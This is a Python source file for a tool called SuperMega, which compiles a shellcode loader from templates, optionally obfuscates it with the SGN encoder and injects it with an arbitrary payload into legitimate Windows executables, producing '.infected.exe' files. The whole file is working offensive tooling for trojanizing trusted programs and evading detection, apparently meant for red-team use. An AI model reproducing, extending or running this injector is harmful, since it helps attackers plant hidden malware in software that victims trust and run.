import shutil
from enum import Enum
import argparse
from typing import Dict
import os
import logging
import time
import pefile

from model.defs import *
from model import *
from helper import *
from config import config
import phases.templater
import phases.compiler
import phases.assembler
import phases.injector
from observer import observer
from peparser.pehelper import extract_code_from_exe

from model.project import Project
from model.settings import Settings

log_messages = []


def main():
    logger.info("Super Mega")
    config.load()
    settings = Settings()

    parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
    parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
    parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
    parser.add_argument('--alloc', type=str, help='Template: which allocator plugin')
    parser.add_argument('--decoder', type=str, help='Template: which decoder plugin')
    parser.add_argument('--exec', type=str, help='Template: which exec plugin')
    parser.add_argument('--rbrunmode', type=str, help='Redbackdoorer run argument (1 EAP, 2 hijack)')
    parser.add_argument('--start-injected', action='store_true', help='Dev: Start the generated infected executable at the end')
    parser.add_argument('--start-loader-shellcode', action='store_true', help='Dev: Start the loader shellcode (without payload)')
    parser.add_argument('--start-final-shellcode', action='store_true', help='Debug: Start the final shellcode (loader + payload)')
    parser.add_argument('--short-call-patching', action='store_true', help='Make short calls long. You will know when you need it.')
    parser.add_argument('--no-clean-at-start', action='store_true', help='Debug: Dont remove any temporary files at start')
    parser.add_argument('--no-clean-at-exit', action='store_true', help='Debug: Dont remove any temporary files at exit')
    parser.add_argument('--verify', type=str, help='Debug: Perform verification: std/iat')
    parser.add_argument('--show', action='store_true', help='Debug: Show tool output')
    args = parser.parse_args()

    if args.show:
        config.ShowCommandOutput = True

    if args.verify:
        settings.payload_path = "shellcodes/createfile.bin"
        settings.verify = True

        settings.try_start_final_infected_exe = False
        settings.try_start_final_shellcode = False

        if args.verify == "peb":
            settings.inject = True
            settings.inject_mode = 2
            settings.inject_exe_in = "exes/7z.exe"
            settings.inject_exe_out = "out/7z-verify.exe"
        elif args.verify == "iat":
            settings.inject = True
            settings.inject_mode = 1 # 2
            settings.inject_exe_in = "exes/procexp64.exe"
            settings.inject_exe_out = "out/procexp64-verify.exe"
        elif args.verify == "rwx":
            settings.inject = True
            settings.inject_mode = 1  # ,2 is broken atm
            settings.inject_exe_in = "exes/wifiinfoview.exe"
            settings.inject_exe_out = "out/wifiinfoview.exe-verify.exe"
        else:
            logger.info("Unknown verify option {}, use std/iat".format(args.verify))
            return

    else:
        settings.try_start_final_infected_exe = args.start_injected
        settings.try_start_final_shellcode = args.start_final_shellcode
        settings.try_start_loader_shellcode = args.start_loader_shellcode

        settings.cleanup_files_on_start = not args.no_clean_at_start
        settings.cleanup_files_on_exit =not args.no_clean_at_exit

        if args.short_call_patching:
            settings.short_call_patching = True

        if args.alloc:
            if args.alloc == "rwx_1":
                settings.alloc_style = AllocStyle.RWX
        if args.decoder:
            if args.decoder == "plain_1":
                settings.decoder_style = DecoderStyle.PLAIN_1
            elif args.decoder == "xor_1":
                settings.decoder_style = DecoderStyle.XOR_1
        if args.exec:
            if args.exec == "direct_1":
                settings.exec_style = ExecStyle.CALL

        if args.rbrunmode:
            if args.rbrunmode == "1" or args.rbrunmode == "2":
                settings.inject_mode = int(args.rbrunmode)
            else:
                logging.error("Invalid mode, use one of:")
                for i in ["1", "2"]:
                    logging.error("  {}  {}".format(i, rbrunmode_str(i)))
                return

        if not args.shellcode or not args.inject:
            logger.error("Require: --shellcode <shellcode file> --inject <injectable.exe>")
            logger.info(r"Example: .\supermega.py --shellcode .\shellcodes\calc64.bin --inject .\exes\7z.exe")
            return 1

        if args.shellcode:
            if not os.path.isfile(args.shellcode):
                logger.info("Could not find: {}".format(args.shellcode))
                return
            settings.payload_path = args.shellcode
        if args.inject:
            if not os.path.isfile(args.inject):
                logger.info("Could not find: {}".format(args.inject))
                return
            settings.inject = True
            settings.inject_exe_in = args.inject
            settings.inject_exe_out = args.inject.replace(".exe", ".infected.exe")

    start(settings)

def get_physical_address(pe, virtual_address):
    # Iterate through the section headers to find which section contains the VA
    for section in pe.sections:
        # Check if the VA is within the range of this section
        if section.VirtualAddress <= virtual_address < section.VirtualAddress + section.Misc_VirtualSize:
            # Calculate the difference between the VA and the section's virtual address
            virtual_offset = virtual_address - section.VirtualAddress
            # Add the difference to the section's pointer to raw data
            return virtual_offset
            #physical_address = section.PointerToRawData + virtual_offset
            #return physical_address
    return None

def start(settings: Settings):
    # Delete: all old files
    if settings.cleanup_files_on_start:
        clean_files()
        delete_all_files_in_directory("logs/")

    # Load our input
    project = Project(settings)
    project.init()

    # Copy: IAT_REUSE loader C files into working directory: build/
    phases.templater.create_c_from_template(
        source_style = SourceStyle.iat_reuse,
        alloc_style  = settings.alloc_style,
        exec_style   = settings.exec_style,
        decoder_style= settings.decoder_style,
        payload_len  = project.payload.len,
    )
    # Compile: IAT_REUSE loader C -> ASM
    if settings.generate_asm_from_c:
        phases.compiler.compile(
            c_in = main_c_file, 
            asm_out = main_asm_file, 
            payload_len = project.payload.len,
            short_call_patching = project.settings.short_call_patching)

    # Decide if we can use IAT_REUSE (all function calls available as import)
    required_functions = phases.compiler.get_function_stubs(main_asm_file)
    if project.exe_host.has_all_iat_functions(required_functions):
        settings.source_style = SourceStyle.iat_reuse
        logger.warning("--[ SourceStyle: Using IAT_REUSE".format())
        # all good, patch ASM
        phases.compiler.fixup_iat_reuse(main_asm_file, project.exe_host)
        observer.add_text("carrier_asm_updated", file_readall_text(main_asm_file))
    else:
        # Not good, Fall back to PEB_WALK
        settings.source_style = SourceStyle.peb_walk
        logger.warning("--[ SourceStyle: Fall back to PEB_WALK".format())
        observer.clean_files()
        clean_files()
        # Copy: PEB_WALK loader C files into working directory: build/
        phases.templater.create_c_from_template(
            source_style = SourceStyle.peb_walk,
            alloc_style  = settings.alloc_style,
            exec_style   = settings.exec_style,
            decoder_style= settings.decoder_style,
            payload_len  = project.payload.len,
        )
        # Compile: PEB_WALK C -> ASM
        if settings.generate_asm_from_c:
            phases.compiler.compile(
                c_in = main_c_file, 
                asm_out = main_asm_file, 
                payload_len = project.payload.len)
        observer.add_text("carrier_asm_updated", file_readall_text(main_asm_file))

    # Assemble: ASM -> Shellcode
    if settings.generate_shc_from_asm:
        phases.assembler.asm_to_shellcode(
            asm_in = main_asm_file, 
            build_exe = main_exe_file, 
            shellcode_out = main_shc_file)
    
    # Try: Starting the loader-shellcode (rarely useful)
    if settings.try_start_loader_shellcode:
        try_start_shellcode(main_shc_file)

    # Merge: shellcode/loader with payload
    if settings.dataref_style == DataRefStyle.APPEND:
        phases.assembler.merge_loader_payload(
            shellcode_in = main_shc_file,
            shellcode_out = main_shc_file,
            payload_data = project.payload.payload_data, 
            decoder_style = settings.decoder_style)

        if settings.verify and settings.source_style == SourceStyle.peb_walk:
            logger.info("--[ Verify final shellcode")
            if not verify_shellcode(main_shc_file):
                logger.info("Could not verify, still continuing")
                #return

        if settings.try_start_final_shellcode:
            logger.info("--[ Test Append shellcode")
            try_start_shellcode(main_shc_file)

        # copy it to out
        shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_shc_file)))

    # RWX Injection
    if project.exe_host.rwx_section != None:
        logger.info("--[ RWX section {} found. Will obfuscate loader+payload and inject into it".format(
            project.exe_host.rwx_section.Name.decode().rstrip('\x00')
        ))
        obfuscate_shc_loader(main_shc_file, main_shc_file + ".sgn")
        observer.add_code("payload_sgn", file_readall_binary(main_shc_file + ".sgn"))
        shutil.move(main_shc_file + ".sgn", main_shc_file)

    # inject merged loader into an exe
    exit_code = 0
    if settings.inject:
        l = len(file_readall_binary(main_shc_file))
        if l + 128 > project.exe_host.code_size:
            logger.error("Error: Shellcode {}+128 too small for target code section {}".format(
                l, project.exe_host.code_size
            ))
            return

        phases.injector.inject_exe(
            shellcode_in = main_shc_file,
            exe_in = settings.inject_exe_in,
            exe_out = settings.inject_exe_out,
            inject_mode = settings.inject_mode,
        )
        if settings.source_style == SourceStyle.iat_reuse:
            phases.injector.injected_fix_iat(
                settings.inject_exe_out, project.exe_host)

            # TODO IF?
            phases.injector.injected_fix_data(
                settings.inject_exe_out, 
                config.data_fixups,
                config.data_fixup_entries,
                project.exe_host)
            
            code = extract_code_from_exe(settings.inject_exe_out)
            pe = pefile.PE(settings.inject_exe_out)
            ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
            ep_raw = get_physical_address(pe, ep)
            pe.close()

            print("Raw: {} / 0x{:x}".format(
                ep_raw, ep_raw))
            observer.add_code("exe_fucking_final", 
                code[ep_raw:ep_raw+300])
            

        if settings.verify:
            logger.info("--[ Verify infected exe")
            exit_code = phases.injector.verify_injected_exe(settings.inject_exe_out)

        elif settings.try_start_final_infected_exe:
            logger.info("--[ Start infected exe: {}".format(settings.inject_exe_out))
            run_process_checkret([
                settings.inject_exe_out,
            ], check=False)

    # Cleanup files
    if settings.cleanup_files_on_exit:
        clean_files()

    # write log to file
    with open("logs/supermega.log", "w") as f:
        for line in log_messages:
            f.write(line + "\n")

    exit(exit_code)


def obfuscate_shc_loader(file_shc_in, file_shc_out):
    logger.info("--[ Obfuscate shellcode with SGN")
    run_process_checkret([
        config.get("path_sgn"),
        "--arch=64",
        "-i", "{}".format(file_shc_in),
        "-o", "{}".format(file_shc_out),
    ], check=True)
    if not os.path.isfile(file_shc_out):
        logger.info("Error")
        return
    else:
        logger.info("   > Success obfuscation")
        pass


def verify_shellcode(shc_name):
    logger.info("---[ Verify shellcode: {}".format(shc_name))

    # check if directory exists
    if not os.path.exists(os.path.dirname(VerifyFilename)):
        logger.info("Error, directory does not exist for: {}".format(VerifyFilename))
        return
    
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_process_checkret([
        config.get("path_runshc"),
        "{}".format(shc_name),
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Shellcode works (file was created)")
        os.remove(VerifyFilename)
        return True
    else:
        logger.error("---> Verify FAIL. Shellcode doesnt work (file was not created)")
        return False


# Logging

# ANSI escape sequences for colors
class LogColors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class CustomFormatter(logging.Formatter):
    #format = "%(asctime)s - %(name)-12s - [%(levelname)-8s] - %(message)s (%(filename)s:%(lineno)d)"
    format = "(%(filename)-12s) %(message)s"

    FORMATS = {
        logging.DEBUG: format,
        logging.INFO: format,
        logging.WARNING: LogColors.WARNING + format + LogColors.ENDC,
        logging.ERROR: LogColors.FAIL + format + LogColors.ENDC,
        logging.CRITICAL: LogColors.FAIL + LogColors.BOLD + format + LogColors.ENDC
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt, datefmt="%Y-%m-%d %H:%M:%S")
        return formatter.format(record)

class ListHandler(logging.Handler):
    def __init__(self, log_list):
        super().__init__()
        self.log_list = log_list

    def emit(self, record):
        # Format the log record and store it in the list
        log_entry = self.format(record)
        self.log_list.append(log_entry)

def setup_logging():
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.INFO)

    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    ch.setFormatter(CustomFormatter())

    list_handler = ListHandler(log_messages)
    list_handler.setLevel(logging.DEBUG)
    list_handler.setFormatter(CustomFormatter())

    root_logger.addHandler(ch)
    root_logger.addHandler(list_handler)


if __name__ == "__main__":
    setup_logging()
    main()
